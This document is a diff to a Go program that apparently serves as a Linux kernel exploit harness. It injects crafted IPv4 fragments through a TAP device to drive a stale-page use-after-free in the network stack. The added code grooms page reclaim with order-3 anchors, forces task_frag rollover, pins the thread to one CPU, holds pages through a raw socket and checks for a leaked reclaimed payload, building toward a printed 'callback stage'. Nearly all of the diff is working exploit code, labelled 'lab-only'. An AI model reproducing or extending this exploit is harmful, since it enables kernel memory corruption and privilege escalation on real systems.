@@ -100,6 +100,10 @@ type cfg struct {
 	staleFragHdrLen     int
 	staleNaturalFrag    bool
 	staleNaturalOverlap bool
+	staleOverlapLocal   bool
+	staleLocalRollover  int
+	staleLocalSingleRef bool
+	staleSingleAnchors  int
 	staleNaturalAnon    bool
 	staleAnonSize       int
 	staleAnonJumbos     int
@@ -163,6 +167,10 @@ func parseCfg() cfg {
 	flag.IntVar(&c.staleFragHdrLen, "stale-frag-hdr-len", 70, "lab-only: linear header length requested for oversized fragment probes")
 	flag.BoolVar(&c.staleNaturalFrag, "stale-natural-frag", false, "use the address-independent jumbo-fragment geometry that naturally plants frags[0]")
 	flag.BoolVar(&c.staleNaturalOverlap, "stale-natural-overlap", false, "lab-only: reclaim the dangling natural-fragment page and verify a live skb payload overlap")
+	flag.BoolVar(&c.staleOverlapLocal, "stale-overlap-local-reassembly", false, "lab-only: deliver the second reclaim datagram locally so IPv4 reassembly runs skb_try_coalesce")
+	flag.IntVar(&c.staleLocalRollover, "stale-local-rollover", 0, "lab-only: page-frag-sized writes after queueing the local reassembly, forcing dangling task_frag refill")
+	flag.BoolVar(&c.staleLocalSingleRef, "stale-local-single-ref", false, "lab-only: keep one coalesced page reference so rollover frees the page cleanly under a stale jumbo descriptor")
+	flag.IntVar(&c.staleSingleAnchors, "stale-single-ref-anchors", 8, "lab-only: incomplete order-3 anchors and reclaim candidates used by the single-ref chain")
 	flag.BoolVar(&c.staleNaturalAnon, "stale-natural-anon", false, "lab-only: reclaim the dangling natural-fragment page as an anonymous mapping and verify a write through task_frag")
 	flag.IntVar(&c.staleAnonSize, "stale-anon-size", 64<<20, "lab-only: bytes of anonymous memory faulted while reclaiming the dangling page")
 	flag.IntVar(&c.staleAnonJumbos, "stale-anon-jumbos", 96, "lab-only: incomplete order-3 fragments released together before the anonymous reclaim")
@@ -268,6 +276,22 @@ func parseCfg() cfg {
 	}
 	if c.staleNaturalAnon && c.staleNaturalOverlap {
 		fmt.Fprintln(os.Stderr, "-stale-natural-anon and -stale-natural-overlap are separate reclaim experiments")
+		os.Exit(1)
+	}
+	if c.staleOverlapLocal && !c.staleNaturalOverlap {
+		fmt.Fprintln(os.Stderr, "-stale-overlap-local-reassembly requires -stale-natural-overlap")
+		os.Exit(1)
+	}
+	if c.staleLocalRollover < 0 || c.staleLocalRollover > 64 || (c.staleLocalRollover != 0 && !c.staleOverlapLocal) {
+		fmt.Fprintln(os.Stderr, "-stale-local-rollover must be 0..64 and requires -stale-overlap-local-reassembly")
+		os.Exit(1)
+	}
+	if c.staleLocalSingleRef && (!c.staleOverlapLocal || c.staleLocalRollover == 0) {
+		fmt.Fprintln(os.Stderr, "-stale-local-single-ref requires -stale-overlap-local-reassembly and a nonzero -stale-local-rollover")
+		os.Exit(1)
+	}
+	if c.staleSingleAnchors < 1 || c.staleSingleAnchors > 64 {
+		fmt.Fprintln(os.Stderr, "-stale-single-ref-anchors must be 1..64")
 		os.Exit(1)
 	}
 	if c.staleAnonSize < 8<<20 || c.staleAnonSize > 1<<30 || c.staleAnonSize%4096 != 0 {
@@ -443,6 +467,11 @@ func run(c cfg) error {
 func runStaleOptionsWrite(tap *os.File, cap *capture, c cfg) error {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
+	restoreAffinity, err := pinCurrentThreadToAllowedCPU()
+	if err != nil {
+		return fmt.Errorf("stale-options: pin current thread to one CPU: %w", err)
+	}
+	defer restoreAffinity()
 	if c.staleFragFile != "" {
 		probe := c
 		probe.staleOptLen = 14
@@ -492,6 +521,42 @@ func runStaleOptionsWrite(tap *os.File, cap *capture, c cfg) error {
 	fmt.Printf("stale-options: callback stage head=%#x skb=%#x dev=%#x callback=%#x groom_count=%d\n",
 		attack.staleHead, attack.staleSKB, attack.staleDev, attack.staleCallback, attack.staleGrooms)
 	return runStaleOptionsAttempt(tap, cap, attack)
+}
+
+func pinCurrentThreadToAllowedCPU() (func(), error) {
+	var oldMask [128]byte
+	_, _, errno := syscall.RawSyscall(syscall.SYS_SCHED_GETAFFINITY, 0,
+		uintptr(len(oldMask)), uintptr(unsafe.Pointer(&oldMask[0])))
+	if errno != 0 {
+		return nil, errno
+	}
+	var oneCPUMask [128]byte
+	found := false
+	for i, b := range oldMask {
+		if b == 0 {
+			continue
+		}
+		for bit := byte(1); bit != 0; bit <<= 1 {
+			if b&bit != 0 {
+				oneCPUMask[i] = bit
+				found = true
+				break
+			}
+		}
+		break
+	}
+	if !found {
+		return nil, errors.New("empty sched_getaffinity mask")
+	}
+	_, _, errno = syscall.RawSyscall(syscall.SYS_SCHED_SETAFFINITY, 0,
+		uintptr(len(oneCPUMask)), uintptr(unsafe.Pointer(&oneCPUMask[0])))
+	if errno != 0 {
+		return nil, errno
+	}
+	return func() {
+		syscall.RawSyscall(syscall.SYS_SCHED_SETAFFINITY, 0,
+			uintptr(len(oldMask)), uintptr(unsafe.Pointer(&oldMask[0])))
+	}, nil
 }
 
 func waitForKernelAddresses(path string, timeout time.Duration) ([]uint64, error) {
@@ -685,7 +750,29 @@ func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
 		// asking the buddy allocator to hand that page to the second jumbo skb.
 		cap.drain(c.staleDelay)
 		collectID = id + 1
+		if c.staleLocalSingleRef {
+			return runStaleLocalSingleRef(tap, cap, c, collectID)
+		}
 		middle, overlapHead, overlapTail := staleNaturalOverlapFrames(c, collectID)
+		var overlapBridge []byte
+		localRawFD := -1
+		if c.staleOverlapLocal {
+			middle, overlapHead, overlapBridge, overlapTail = staleNaturalLocalCoalesceFrames(c, collectID)
+			if c.staleLocalRollover != 0 {
+				var err error
+				localRawFD, err = syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, ipProtoRaw)
+				if err != nil {
+					return fmt.Errorf("stale-options: open local protocol-253 hold socket: %w", err)
+				}
+				defer syscall.Close(localRawFD)
+				if err := syscall.Bind(localRawFD, &syscall.SockaddrInet4{Addr: [4]byte{10, 0, 0, 1}}); err != nil {
+					return fmt.Errorf("stale-options: bind local protocol-253 hold socket: %w", err)
+				}
+				if err := syscall.SetsockoptInt(localRawFD, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 1<<20); err != nil {
+					return fmt.Errorf("stale-options: enlarge local protocol-253 hold socket: %w", err)
+				}
+			}
+		}
 		if err := writeTapGSO(tap, middle, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400,
 			false, 0, 0); err != nil {
 			return fmt.Errorf("stale-options: overlap reclaim fragment: %w", err)
@@ -693,10 +780,40 @@ func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
 		if err := writeTap(tap, overlapHead, false, 0, 0); err != nil {
 			return fmt.Errorf("stale-options: overlap head fragment: %w", err)
 		}
+		if overlapBridge != nil {
+			if err := writeTap(tap, overlapBridge, false, 0, 0); err != nil {
+				return fmt.Errorf("stale-options: overlap bridge fragment: %w", err)
+			}
+		}
 		if err := writeTap(tap, overlapTail, false, 0, 0); err != nil {
 			return fmt.Errorf("stale-options: overlap tail fragment: %w", err)
 		}
+		if localRawFD >= 0 {
+			time.Sleep(20 * time.Millisecond)
+			queued, err := socketQueuedBytes(localRawFD)
+			if err != nil {
+				return fmt.Errorf("stale-options: inspect local protocol-253 hold socket: %w", err)
+			}
+			if queued == 0 {
+				return errors.New("stale-options: local reassembled datagram was not queued on the hold socket")
+			}
+			rollover, err := stalePageGroomFrame(0x6d, 0, 0, 0, 0, 0, 0, 0, 0, "")
+			if err != nil {
+				return err
+			}
+			for i := 0; i < c.staleLocalRollover; i++ {
+				if err := writeTap(tap, rollover, false, 0, 0); err != nil {
+					return fmt.Errorf("stale-options: local task_frag rollover %d/%d: %w", i+1, c.staleLocalRollover, err)
+				}
+			}
+			fmt.Printf("stale-options: local hold queued_bytes=%d rollover_writes=%d\n", queued, c.staleLocalRollover)
+		}
 		overlapWant = append([]byte(nil), overlapHead[:16]...)
+	}
+	if c.staleOverlapLocal {
+		cap.drain(c.capture)
+		fmt.Println("stale-options: local reclaim datagram submitted; post-coalesce verification requires the lab tracer")
+		return nil
 	}
 
 	pkts := cap.collect(c.capture, collectID)
@@ -731,7 +848,128 @@ func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
 	return nil
 }
 
+func socketQueuedBytes(fd int) (int, error) {
+	var queued int32
+	_, _, errno := syscall.Syscall(syscall.SYS_IOCTL, uintptr(fd), 0x541b,
+		uintptr(unsafe.Pointer(&queued))) // FIONREAD on Linux
+	if errno != 0 {
+		return 0, errno
+	}
+	return int(queued), nil
+}
+
+func runStaleLocalSingleRef(tap *os.File, cap *capture, c cfg, anchorID uint16) error {
+	localRawFD, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, ipProtoRaw)
+	if err != nil {
+		return fmt.Errorf("stale-options: open single-ref hold socket: %w", err)
+	}
+	if err := syscall.Bind(localRawFD, &syscall.SockaddrInet4{Addr: [4]byte{10, 0, 0, 1}}); err != nil {
+		syscall.Close(localRawFD)
+		return fmt.Errorf("stale-options: bind single-ref hold socket: %w", err)
+	}
+	if err := syscall.SetsockoptInt(localRawFD, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 1<<20); err != nil {
+		syscall.Close(localRawFD)
+		return fmt.Errorf("stale-options: enlarge single-ref hold socket: %w", err)
+	}
+
+	for i := 0; i < c.staleSingleAnchors; i++ {
+		anchor := staleNaturalJumboFragment(c, anchorID+uint16(i), 8, byte(0x70+i%16))
+		if err := writeTapGSO(tap, anchor, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400,
+			false, 0, 0); err != nil {
+			syscall.Close(localRawFD)
+			return fmt.Errorf("stale-options: single-ref anchor %d/%d: %w", i+1, c.staleSingleAnchors, err)
+		}
+	}
+
+	localID := anchorID + uint16(c.staleSingleAnchors)
+	localHead, localBridge := staleNaturalLocalSingleRefFrames(c, localID)
+	if err := writeTapGSO(tap, localHead, byte(c.staleFragGSOType), 322, 1400,
+		false, 0, 0); err != nil {
+		syscall.Close(localRawFD)
+		return fmt.Errorf("stale-options: single-ref local head: %w", err)
+	}
+	if err := writeTap(tap, localBridge, false, 0, 0); err != nil {
+		syscall.Close(localRawFD)
+		return fmt.Errorf("stale-options: single-ref local bridge: %w", err)
+	}
+	time.Sleep(20 * time.Millisecond)
+	queued, err := socketQueuedBytes(localRawFD)
+	if err != nil || queued == 0 {
+		syscall.Close(localRawFD)
+		if err != nil {
+			return fmt.Errorf("stale-options: inspect single-ref hold socket: %w", err)
+		}
+		return errors.New("stale-options: single-ref local datagram was not queued")
+	}
+
+	rollover, err := stalePageGroomFrame(0x6d, 0, 0, 0, 0, 0, 0, 0, 0, "")
+	if err != nil {
+		syscall.Close(localRawFD)
+		return err
+	}
+	for i := 0; i < c.staleLocalRollover; i++ {
+		if err := writeTap(tap, rollover, false, 0, 0); err != nil {
+			syscall.Close(localRawFD)
+			return fmt.Errorf("stale-options: single-ref rollover %d/%d: %w", i+1, c.staleLocalRollover, err)
+		}
+	}
+	if err := syscall.Close(localRawFD); err != nil {
+		return fmt.Errorf("stale-options: close single-ref hold socket: %w", err)
+	}
+	time.Sleep(20 * time.Millisecond)
+
+	reclaimID := localID + 1
+	for i := 0; i < c.staleSingleAnchors; i++ {
+		reclaim := staleNaturalJumboFragment(c, reclaimID+uint16(i), 8, byte(0x80+i%16))
+		if err := writeTapGSO(tap, reclaim, byte(c.staleFragGSOType), uint16(c.staleFragHdrLen), 1400,
+			false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: single-ref order-3 reclaim %d/%d: %w", i+1, c.staleSingleAnchors, err)
+		}
+	}
+
+	staleAnchor := -1
+	staleFill := byte(0)
+	for i := 0; i < c.staleSingleAnchors; i++ {
+		_, head, tail := staleNaturalOverlapFrames(c, anchorID+uint16(i))
+		if err := writeTap(tap, head, false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: complete single-ref anchor %d head: %w", i, err)
+		}
+		if err := writeTap(tap, tail, false, 0, 0); err != nil {
+			return fmt.Errorf("stale-options: complete single-ref anchor %d tail: %w", i, err)
+		}
+		pkts := cap.collect(c.capture, anchorID+uint16(i))
+		window, ok := ipv4PayloadWindow(pkts, 16, 16)
+		if !ok || len(window) == 0 {
+			continue
+		}
+		uniform := true
+		for _, b := range window[1:] {
+			if b != window[0] {
+				uniform = false
+				break
+			}
+		}
+		if uniform && window[0] >= 0x80 && window[0] < byte(0x80+c.staleSingleAnchors) {
+			staleAnchor = i
+			staleFill = window[0]
+			break
+		}
+	}
+	if staleAnchor < 0 {
+		return errors.New("stale-options: no anchor disclosed a reclaimed order-3 payload")
+	}
+	fmt.Printf("stale-options: single-ref queued_bytes=%d rollover_writes=%d anchors=%d anchor_ids=%#x..%#x local_id=%#x reclaim_ids=%#x..%#x stale_anchor=%d reclaimed_fill=%#02x\n",
+		queued, c.staleLocalRollover, c.staleSingleAnchors, anchorID,
+		anchorID+uint16(c.staleSingleAnchors-1), localID, reclaimID,
+		reclaimID+uint16(c.staleSingleAnchors-1), staleAnchor, staleFill)
+	return nil
+}
+
 func staleNaturalOverlapFrames(c cfg, id uint16) (middle, head, tail []byte) {
+	return staleNaturalOverlapFramesFor(c, id, net.ParseIP("10.99.0.2").To4())
+}
+
+func staleNaturalOverlapFramesFor(c cfg, id uint16, dst net.IP) (middle, head, tail []byte) {
 	// The second jumbo fragment has the same exact split as the natural
 	// descriptor seed: hdr_len bytes are linear and one order-3 page is
 	// nonlinear. Its logical IPv4 length now retains that whole page, so the
@@ -739,13 +977,56 @@ func staleNaturalOverlapFrames(c cfg, id uint16) (middle, head, tail []byte) {
 	l2 := l2LenForTags(c.vlanTags)
 	middlePayloadLen := c.staleFragPadLen - l2 - ipLen
 	middlePayload := bytesRepeat(middlePayloadLen, 0x72)
-	middle = frameWithVLAN(ipv4PacketWithOptions(8, true, middlePayload, id, nil), c.vlanTags)
+	src := net.ParseIP("10.0.0.2").To4()
+	middle = frameWithVLAN(ipv4PacketWithOptionsFor(8, true, middlePayload, id, nil,
+		src, dst, ipProtoRaw), c.vlanTags)
 
 	headPayload := bytesRepeat(8, 0x68)
-	head = frameWithoutVLAN(ipv4PacketWithOptions(0, true, headPayload, id, nil))
+	head = frameWithoutVLAN(ipv4PacketWithOptionsFor(0, true, headPayload, id, nil,
+		src, dst, ipProtoRaw))
 	tailPayload := bytesRepeat(8, 0x7a)
-	tail = frameWithoutVLAN(ipv4PacketWithOptions(8+middlePayloadLen, false, tailPayload, id, nil))
+	tail = frameWithoutVLAN(ipv4PacketWithOptionsFor(8+middlePayloadLen, false, tailPayload, id, nil,
+		src, dst, ipProtoRaw))
 	return middle, head, tail
+}
+
+func staleNaturalJumboFragment(c cfg, id uint16, offset int, fill byte) []byte {
+	l2 := l2LenForTags(c.vlanTags)
+	payloadLen := c.staleFragPadLen - l2 - ipLen
+	return frameWithVLAN(ipv4PacketWithOptions(offset, true, bytesRepeat(payloadLen, fill), id, nil),
+		c.vlanTags)
+}
+
+func staleNaturalLocalSingleRefFrames(c cfg, id uint16) (head, bridge []byte) {
+	src := net.ParseIP("10.0.0.2").To4()
+	dst := net.ParseIP("10.0.0.1").To4()
+	logicalHead := frameWithVLAN(ipv4PacketWithOptionsFor(0, true, bytesRepeat(8, 0x68), id, nil,
+		src, dst, ipProtoRaw), c.vlanTags)
+	head = stalePaddedGSOFrame(logicalHead, c.staleFragPadLen, 0x71)
+	bridge = frameWithoutVLAN(ipv4PacketWithOptionsFor(8, false, bytesRepeat(512, 0x62), id, nil,
+		src, dst, ipProtoRaw))
+	return head, bridge
+}
+
+func staleNaturalLocalCoalesceFrames(c cfg, id uint16) (middle, head, bridge, tail []byte) {
+	// The small bridge precedes the jumbo in fragment order. Both its head and
+	// the reassembly head are built from current->task_frag, so
+	// skb_try_coalesce can steal the bridge head into the destination shinfo
+	// before the kmalloc-backed jumbo head rejects coalescing.
+	l2 := l2LenForTags(c.vlanTags)
+	middlePayloadLen := c.staleFragPadLen - l2 - ipLen
+	middlePayload := bytesRepeat(middlePayloadLen, 0x72)
+	src := net.ParseIP("10.0.0.2").To4()
+	dst := net.ParseIP("10.0.0.1").To4()
+	middle = frameWithVLAN(ipv4PacketWithOptionsFor(32, true, middlePayload, id, nil,
+		src, dst, ipProtoRaw), c.vlanTags)
+	head = frameWithoutVLAN(ipv4PacketWithOptionsFor(0, true, bytesRepeat(8, 0x68), id, nil,
+		src, dst, ipProtoRaw))
+	bridge = frameWithoutVLAN(ipv4PacketWithOptionsFor(8, true, bytesRepeat(24, 0x62), id, nil,
+		src, dst, ipProtoRaw))
+	tail = frameWithoutVLAN(ipv4PacketWithOptionsFor(32+middlePayloadLen, false, bytesRepeat(8, 0x7a), id, nil,
+		src, dst, ipProtoRaw))
+	return middle, head, bridge, tail
 }
 
 func ipv4PayloadWindow(pkts [][]byte, offset, length int) ([]byte, bool) {
